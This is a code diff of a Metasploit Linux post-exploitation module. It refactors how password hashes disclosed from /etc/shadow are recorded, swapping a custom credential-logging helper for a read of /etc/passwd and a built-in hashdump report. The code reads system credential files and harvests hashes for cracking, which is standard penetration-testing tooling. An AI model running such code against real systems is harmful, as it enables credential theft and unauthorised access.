@@ -6,6 +6,7 @@
 class MetasploitModule < Msf::Post
 
   include Msf::Post::File
+  include Msf::Post::Linux
   include Msf::Post::Linux::System
   include Msf::Post::Linux::Kernel
   include Msf::Exploit::FileDropper
@@ -320,18 +321,9 @@ class MetasploitModule < Msf::Post
     if output.include?('$')
 
       print_good('Successfully disclosed /etc/shadow')
-      log_shadow_credentials(output)
 
-      loot = store_loot(
-        'linux.shadow',
-        'text/plain',
-        session,
-        output,
-        'shadow.txt',
-        'Linux Password Shadow File'
-      )
-
-      print_good("Loot stored at: #{loot}")
+      passwd_file = read_file('/etc/passwd')
+      report_linux_hashdump(passwd_file, output)
 
       print_line
       print_line(output)
@@ -346,39 +338,4 @@ class MetasploitModule < Msf::Post
     end
   end
 
-  # Log disclosed shadow hashes using the same credential handling as modules/post/linux/gather/hashdump.rb
-  def log_shadow_credentials(shadow_text)
-    return if shadow_text.nil? || shadow_text.empty?
-
-    shadow_text.each_line do |line|
-      next if line.strip.empty?
-
-      hash_parts = line.split(':')
-      next unless hash_parts.length >= 2
-
-      username = hash_parts[0]
-      private_data = hash_parts[1]
-      next if private_data.nil? || private_data.empty?
-      next if ['*', '!'].include?(private_data)
-
-      jtr_format = Metasploit::Framework::Hashes.identify_hash(private_data)
-      jtr_format = 'des,bsdi,crypt' if jtr_format.empty?
-
-      credential_data = {
-        jtr_format: jtr_format,
-        origin_type: :session,
-        post_reference_name: refname,
-        private_type: :nonreplayable_hash,
-        private_data: private_data,
-        session_id: session_db_id,
-        username: username,
-        workspace_id: myworkspace_id
-      }
-
-      create_credential(credential_data)
-      vprint_good("Logged shadow credential for #{username}")
-    end
-  rescue StandardError => e
-    vprint_error("Unable to log shadow credentials: #{e}")
-  end
 end
